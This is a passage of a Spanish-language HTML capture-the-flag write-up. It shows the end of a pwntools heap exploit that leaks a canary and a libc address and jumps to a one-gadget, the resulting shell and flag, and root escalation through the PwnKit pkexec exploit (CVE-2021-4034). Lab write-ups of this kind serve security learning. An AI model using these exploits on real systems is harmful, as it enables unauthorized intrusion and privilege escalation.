+cmemo(p64(leak) </span><span class="kd">*</span><span class="p"> (</span><span class="na">0x28</span><span class="kd"> //</span><span class="ma"> 8</span><span class="p">),</span><span class="k"> b</span><span class="s2">"no"</span><span class="p">,</span><span class="k"> b</span><span class="s2">"A"</span><span class="kd"> *</span><span class="na"> 0x28</span><span class="p">)
+cmemo(</span><span class="k">b</span><span class="s2">"A"</span><span class="kd"> *</span><span class="na"> 0x8</span><span class="kd"> + </span><span class="p">p64(</span><span class="na">0x21</span><span class="p">) </span><span class="kd">+</span><span class="p"> p64(schunk </span><span class="kd">+</span><span class="na"> 0x18</span><span class="p">) </span><span class="kd">+</span><span class="k"> b</span><span class="s2">"A"</span><span class="kd"> *</span><span class="na"> 0x8</span><span class="kd"> +</span><span class="p"> p64(</span><span class="na">0x21</span><span class="p">),</span><span class="s2"> "yes"</span><span class="p">)
+cmemo(</span><span class="k">b</span><span class="s2">"A"</span><span class="kd"> *</span><span class="na"> 0x8</span><span class="p">, </span><span class="k">b</span><span class="s2">"no"</span><span class="p">, p64(canary) </span><span class="kd">+</span><span class="k"> b</span><span class="s2">"A"</span><span class="kd"> *</span><span class="na"> 0x8</span><span class="kd"> +</span><span class="p"> p64(libc </span><span class="kd">+</span><span class="na"> 0x45216</span><span class="p">))
+tout(</span><span class="k">b</span><span class="s2">"yes\x00"</span><span class="p">)
+shell.sendline(</span><span class="k">b</span><span class="s2">"export TERM=xterm; cd"</span><span class="p">)
+shell.interactive()</span>
+</code></pre></div></div>
+
+<div><p>Al ejecutarlo conseguimos shell como memo y la última flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3</span><span class="p"> memo.py
+[</span><span class="s2">+</span><span class="p">] Opening connection to 10.13.37.10 on port 7777: Done
+[</span><span class="na">*</span><span class="p">] Switching to interactive mode
+Quitter!
+</span><span class="kd">$</span><span class="p"> id
+uid=1007(memo) gid=1007(memo) groups=1007(memo)
+</span><span class="kd">$</span><span class="p"> hostname -I
+10.13.37.10 dead:beef::250:56ff:feb9:8e05 
+</span><span class="kd">$</span><span class="p"> cat flag.txt
+Congrats! </span><span class="kd">JET{7h47s_7h3_sp1r17}</span><span class="p">
+
+                               .\
+                         .\   / _\   .\
+                        /_ \   ||   / _\
+                         ||    ||    ||
+                  ; ,     \`.__||__.'/
+          |\     /( ;\_.;  `./|  __.'
+          ' `.  _|_\/_;-'_ .' '||
+           \ _/`       `.-\_ / ||      _
+       , _ _`; ,--.   ,--. ;'_ _|,     |
+       '`''\| /  ,-\ | _,-\ |/''`'  _  |
+        \ .-- \__\_/ /` )_/ --. /   |  |       _
+        /    .         -'  .    \ --|--|--.  .' \
+       |     /             \     |  |  |   \ |---'
+    .   .  -' `-..____...-' `-  .   |  |    |\  _
+ .'`'.__ `._      `-..-''    _.'|   |  | _  | `-'      _
+  \ .--.`.  `-..__    _,..-'   L|   |    |             |
+   '    \ \      _,| |,_      /_7)  |    |   _       _ |  _
+         \ \    /       \ _.-'/||        | .' \     _| |  |
+          \ \  /.'|   |`.__.'` ||     .--| |--- _   /| |  |
+           \ `//_/     \       ||    /   | \  _ \  / | |  |
+            `/ \|       |      ||   |    |  `-'  \/  | '--|      _
+             `"`'.  _  .'      ||    `--'|                |   .--/
+                  \ | /        ||                         '--'
+                   |'|  mx     'J        made me do it! ;)
+                .-.|||.-.
+               '----"----'</span>
+</code></pre></div></div>
+
+<div><strong><h3>Shell como usuario root</h3></strong></div>
+
+<div><p>Habiamos visto el pkexec suid, nos aprovechamos del <a href="https://github.com/berdav/CVE-2021-4034">pwnkit</a> y conseguimos shell como root</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">memo@jet</span><span class="p">:</span><span class="na">~</span><span class="p">$ ls -l /usr/bin/pkexec
+.rwsr-xr-x 1 root root 23376 Jan 17 2016    /usr/bin/pkexec
+<span class="s2">memo@jet</span><span class="p">:</span><span class="na">~</span><span class="p">$ ./cve-2021-4034
+</span><span class="s2">root@jet</span><span class="p">:</span><span class="na">~</span><span class="p"># whoami
+root
+</span><span class="s2">root@jet</span><span class="p">:</span><span class="na">~</span><span class="p">#</span>
+</code></pre></div></div>
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
